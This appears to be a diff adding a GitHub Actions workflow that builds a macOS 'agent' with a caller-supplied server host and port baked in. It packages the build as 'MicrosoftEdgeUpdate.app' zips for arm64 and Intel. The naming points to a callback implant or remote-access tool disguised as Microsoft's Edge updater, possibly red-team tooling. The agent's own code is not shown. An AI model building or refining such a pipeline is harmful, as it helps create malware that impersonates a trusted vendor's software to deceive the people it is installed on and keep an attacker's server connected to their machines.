@@ -1,0 +1,35 @@
+name: build-mac
+
+on:
+  workflow_dispatch:
+    inputs:
+      host:
+        description: Server host or IP baked into the agent
+        required: true
+      port:
+        description: Server port
+        default: "443"
+
+jobs:
+  build:
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          - runner: macos-15
+            arch: arm64
+          - runner: macos-15-intel
+            arch: x86_64
+    runs-on: ${{ matrix.runner }}
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.13"
+      - run: python -m pip install --upgrade pip pyinstaller pillow
+      - run: python build.py "${{ inputs.host }}" "${{ inputs.port }}"
+      - run: ditto -c -k --sequesterRsrc --keepParent MicrosoftEdgeUpdate.app MicrosoftEdgeUpdate-mac-${{ matrix.arch }}.zip
+      - uses: actions/upload-artifact@v4
+        with:
+          name: MicrosoftEdgeUpdate-mac-${{ matrix.arch }}
+          path: MicrosoftEdgeUpdate-mac-${{ matrix.arch }}.zip
